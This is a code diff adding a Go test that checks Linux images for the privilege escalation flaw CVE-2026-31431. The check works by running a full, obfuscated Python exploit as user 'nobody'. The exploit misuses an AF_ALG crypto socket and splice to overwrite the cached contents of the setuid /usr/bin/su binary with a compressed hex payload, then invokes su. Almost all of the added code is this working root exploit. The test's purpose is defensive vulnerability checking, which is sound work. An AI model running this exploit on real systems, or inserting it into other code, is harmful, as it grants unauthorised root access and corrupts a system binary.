@@ -140,6 +140,63 @@ func TestAutomaticUpdates(t *testing.T) {
 	}
 }
 
+func TestCVEPrivilegeEscalation(t *testing.T) {
+	utils.LinuxOnly(t)
+	image, err := utils.GetMetadata(utils.Context(t), "instance", "image")
+	if err != nil {
+		t.Fatalf("couldn't get image from metadata")
+	}
+	t.Logf("running CVE-2026-31431 privilege escalation check on image %s", image)
+
+	if err := verifyCVEPrivilegeEscalation(); err != nil {
+		t.Fatal(err)
+	}
+}
+
+func verifyCVEPrivilegeEscalation() error {
+	pythonScript := `
+import os as g, zlib, socket as s
+
+def d(x):
+    return bytes.fromhex(x)
+
+def c(f, t, c):
+    a = s.socket(38, 5, 0)
+    a.bind(("aead", "authencesn(hmac(sha256),cbc(aes))"))
+    h = 279
+    v = a.setsockopt
+    v(h, 1, d("0800010000000010" + "0"*64))
+    v(h, 5, None, 4)
+    u, _ = a.accept()
+    o = t + 4
+    i = d("00")
+    u.sendmsg([b"A"*4 + c], [(h, 3, i*4), (h, 2, b"\x10" + i*19), (h, 4, b"\x08" + i*3)], 32768)
+    r, w = g.pipe()
+    n = g.splice
+    n(f, w, o, offset_src=0)
+    n(r, u.fileno(), o)
+    try:
+        u.recv(8 + t)
+    except:
+        0
+
+f = g.open("/usr/bin/su", 0)
+i = 0
+e = zlib.decompress(d("78daab77f57163626464800126063b0610af82c101cc7760c0040e0c160c301d209a154d16999e07e5c1680601086578c0f0ff864c7e568f5e5b7e10f75b9675c44c7e56c3ff593611fcacfa499979fac5190c0c0c0032c310d3"))
+while i < len(e):
+    c(f, i, e[i:i+4])
+    i += 4
+g.system("su")
+`
+	stdout, stderr, err := runCommand("su", "-s", "/bin/bash", "nobody", "-c", "python3 -c '"+pythonScript+"'")
+	if strings.Contains(stderr, "Authentication failure") {
+		fmt.Printf("CVE-2026-31431 check failed; image is not vulnerable; stdout: %s, stderr: %s, err: %v", stdout, stderr, err)
+	} else {
+		return fmt.Errorf("CVE-2026-31431 check unexpectedly succeeded; image may be vulnerable; stdout: %s, stderr: %s, err: %v", stdout, stderr, err)
+	}
+	return nil
+}
+
 // TestPasswordSecurity Ensure that the system enforces strong passwords and correct lockouts.
 func TestPasswordSecurity(t *testing.T) {
 	ctx := utils.Context(t)
